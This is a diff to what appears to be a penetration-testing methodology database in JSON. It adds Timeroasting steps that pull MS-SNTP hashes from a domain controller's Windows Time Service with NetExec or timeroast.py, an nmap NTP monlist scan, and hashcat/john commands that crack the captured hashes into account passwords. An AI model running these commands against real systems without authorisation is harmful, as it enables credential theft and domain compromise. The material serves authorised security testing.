@@ -1083,7 +1083,7 @@
     "id": "kerberos",
     "name": "Kerberos Attacks (Port 88)",
     "category": "network",
-    "description": "Comprehensive Active Directory Kerberos attack methodology on port 88. Covers user enumeration (Kerbrute), AS-REP Roasting, Kerberoasting SPN accounts, and Pass-the-Ticket.",
+    "description": "Comprehensive Active Directory Kerberos and Roasting attack methodology on port 88. Covers user enumeration (Kerbrute), AS-REP Roasting, Kerberoasting SPN accounts, Timeroasting (MS-SNTP), and Pass-the-Ticket.",
     "port_triggers": [
       88
     ],
@@ -1091,7 +1091,9 @@
       "kerberos",
       "active-directory",
       "kerberoasting",
-      "asreproast"
+      "asreproast",
+      "timeroasting",
+      "timeroast"
     ],
     "steps": [
       {
@@ -1151,6 +1153,28 @@
         "if_failure": "No SPNs found or account credentials invalid. Check LDAP descriptions or SMB shares.",
         "references": [
           "https://wadcoms.github.io/"
+        ]
+      },
+      {
+        "id": "kerb-timeroast",
+        "title": "Timeroasting (Extract MS-SNTP Hashes from W32Time)",
+        "phase": "exploitation",
+        "purpose": "Query Windows Time Service (W32Time) on the Domain Controller over UDP port 123 using RID ranges to extract crackable MS-SNTP MD5 authentication digests with zero initial credentials.",
+        "command": "nxc smb {{TARGET}} -u '' -p '' -M timeroast",
+        "expected_output": [
+          "[*] Querying DC for RID 500 (Administrator)...",
+          "$ntp$1$82f9...$91b3...",
+          "[+] Captured MS-SNTP hash for Administrator"
+        ],
+        "common_mistakes": [
+          "If NetExec fails, fallback to standalone script: `python3 timeroast.py --dc-ip {{TARGET}} -r 500-2000 -outputfile timeroast.hashes`.",
+          "W32Time uses UDP port 123; ensure UDP traffic to the DC is not filtered."
+        ],
+        "if_success": "MS-SNTP hash captured! Crack with Hashcat mode 31300: `hashcat -m 31300 timeroast.hashes rockyou.txt -r best64.rule`.",
+        "if_failure": "Target DC does not support W32Time authentication or UDP port 123 is closed.",
+        "references": [
+          "https://github.com/Secarma/timeroast",
+          "https://hashcat.net/wiki/doku.php?id=example_hashes"
         ]
       },
       {
@@ -1607,6 +1631,86 @@
         "if_failure": "Root squashed (nobody:nogroup). Check for user UID spoofing (`useradd -u <target_uid>`).",
         "references": [
           "https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "ntp",
+    "name": "Network Time Protocol & Timeroasting (Port 123)",
+    "category": "network",
+    "description": "Comprehensive enumeration and exploitation methodology for NTP and Windows Time Service (W32Time) on UDP port 123. Covers NTP monlist query, server info inspection, unauthenticated Timeroasting against Active Directory Domain Controllers, and offline MS-SNTP hash cracking.",
+    "port_triggers": [
+      123
+    ],
+    "tags": [
+      "ntp",
+      "timeroasting",
+      "timeroast",
+      "active-directory",
+      "w32time",
+      "udp"
+    ],
+    "steps": [
+      {
+        "id": "ntp-enum-info",
+        "title": "NTP Service Info & Monlist Query",
+        "phase": "reconnaissance",
+        "purpose": "Inspect NTP server configuration, version information, peer associations, and test for NTP monlist reflection vulnerability.",
+        "command": "nmap -sU -p 123 --script ntp-info,ntp-monlist {{TARGET}}",
+        "expected_output": [
+          "123/udp open  ntp",
+          "| ntp-info:",
+          "|_  version: ntpd 4.2.8 / Microsoft Windows Time Service"
+        ],
+        "common_mistakes": [
+          "NTP runs exclusively over UDP; remember `-sU` flag in Nmap."
+        ],
+        "if_success": "NTP service details identified! If Windows Time Service or Active Directory DC, proceed to Timeroasting.",
+        "if_failure": "UDP port 123 closed or filtered by firewall.",
+        "references": [
+          "https://book.hacktricks.xyz/network-services-pentesting/pentesting-ntp"
+        ]
+      },
+      {
+        "id": "ntp-timeroast-nxc",
+        "title": "Timeroasting via NetExec (Extract MS-SNTP Digest Hashes)",
+        "phase": "exploitation",
+        "purpose": "Exploit Windows Time Service (W32Time) on the Domain Controller to request authenticated SNTP timestamps using account RIDs, extracting crackable MD5 authentication digests with zero initial credentials.",
+        "command": "nxc smb {{TARGET}} -u '' -p '' -M timeroast",
+        "expected_output": [
+          "[*] Querying DC for RID 500 (Administrator)...",
+          "$ntp$1$a839f...$93e7...",
+          "[+] Captured MS-SNTP hash for Administrator"
+        ],
+        "common_mistakes": [
+          "If authenticated credentials are known, try `nxc smb {{TARGET}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -M timeroast`.",
+          "If NetExec timeroast module is unavailable, use `python3 timeroast.py --dc-ip {{TARGET}} -r 500-2000 -outputfile timeroast.hashes`."
+        ],
+        "if_success": "MS-SNTP hashes extracted! Proceed to offline cracking with Hashcat mode 31300.",
+        "if_failure": "Target is not an Active Directory Domain Controller or W32Time authentication is disabled.",
+        "references": [
+          "https://github.com/Secarma/timeroast",
+          "https://wadcoms.github.io/"
+        ]
+      },
+      {
+        "id": "ntp-crack-timeroast",
+        "title": "Crack Timeroast Hashes (Hashcat Mode 31300)",
+        "phase": "exploitation",
+        "purpose": "Crack the extracted MS-SNTP authentication digest hashes offline using Hashcat mode 31300 or John the Ripper.",
+        "command": "hashcat -m 31300 timeroast.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O",
+        "expected_output": [
+          "$ntp$1$...:Password123!",
+          "Status: Cracked"
+        ],
+        "common_mistakes": [
+          "Ensure hash format matches Hashcat mode 31300 (format: `$ntp$1$<salt>$<hash>`)."
+        ],
+        "if_success": "Plaintext account password recovered! Use credentials for domain access across SMB, WinRM, or Kerberos.",
+        "if_failure": "Password not in wordlist. Run mask attack or hybrid rules.",
+        "references": [
+          "https://hashcat.net/wiki/doku.php?id=example_hashes"
         ]
       }
     ]
@@ -2469,13 +2573,15 @@
     "id": "password-cracking",
     "name": "Password Attacks & Hash Cracking",
     "category": "passwords",
-    "description": "Comprehensive methodology for identifying and cracking password hashes. Covers NTLM, NetNTLMv2, Kerberoast TGS, AS-REP TGT, Linux /etc/shadow, KeePass databases, ZIP/RAR archives, and SSH keys.",
+    "description": "Comprehensive methodology for identifying and cracking password hashes. Covers NTLM, NetNTLMv2, Kerberoast TGS, AS-REP TGT, Timeroast MS-SNTP, Linux /etc/shadow, KeePass databases, ZIP/RAR archives, and SSH keys.",
     "port_triggers": [],
     "tags": [
       "hashcat",
       "john",
       "passwords",
-      "cracking"
+      "cracking",
+      "timeroasting",
+      "kerberoasting"
     ],
     "steps": [
       {
@@ -2572,6 +2678,26 @@
         "if_failure": "Try rule-based dictionary attacks.",
         "references": [
           "https://wadcoms.github.io/"
+        ]
+      },
+      {
+        "id": "hash-crack-timeroast",
+        "title": "Crack Timeroast MS-SNTP Hashes (Mode 31300)",
+        "phase": "exploitation",
+        "purpose": "Crack Windows Time Service (W32Time) MS-SNTP authentication digest hashes extracted via Timeroasting.",
+        "command": "hashcat -m 31300 timeroast.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O",
+        "expected_output": [
+          "$ntp$1$82f9...$91b3...:Password123!",
+          "Status: Cracked"
+        ],
+        "common_mistakes": [
+          "Ensure hash file format matches Hashcat mode 31300 (format `$ntp$1$<salt>$<hash>`).",
+          "For John the Ripper, use `john --format=timeroast timeroast.hashes --wordlist=/usr/share/wordlists/rockyou.txt`."
+        ],
+        "if_success": "Plaintext account password cracked! Authenticate to domain services.",
+        "if_failure": "Password not in rockyou.txt. Try rule mutations or custom wordlists.",
+        "references": [
+          "https://hashcat.net/wiki/doku.php?id=example_hashes"
         ]
       },
       {
